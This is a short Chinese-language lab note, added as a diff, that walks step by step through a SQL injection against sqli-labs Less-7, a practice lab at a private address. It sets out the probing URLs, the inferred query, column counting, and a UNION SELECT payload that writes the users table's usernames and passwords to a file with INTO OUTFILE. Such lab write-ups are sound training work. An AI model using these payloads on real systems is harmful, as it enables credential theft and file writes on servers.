@@ -1,0 +1,18 @@
+http://10.0.2.15/sqli/Less-7/?id=1
+显示：You are in.... Use outfile......
+http://10.0.2.15/sqli/Less-7/?id=1\
+显示：报错' '1\')) LIMIT 0,1 '
+即推测sql语句为 select 字段名 from 表名 where id = (('输入的id')) limit 0,1;
+
+验证：http://10.0.2.15/sqli/Less-7/?id=1')) --+
+显示：You are in.... Use outfile......
+说明推测正确
+
+http://10.0.2.15/sqli/Less-7/?id=1')) order by 3--+
+显示：You are in.... Use outfile......
+说明字段数至少为3
+http://10.0.2.15/sqli/Less-7/?id=1')) order by 4--+
+报错，说明字段数为3
+
+http://10.0.2.15/sqli/Less-7/?id=1')) union select 1,2,group_concat(username,0x3a,password) from users into outfile "/root/桌面/sqlilabs_qiu/Mysql注入读写文件Less7/out.txt"--+
+写文件（可能会出现权限报错，百度解决）
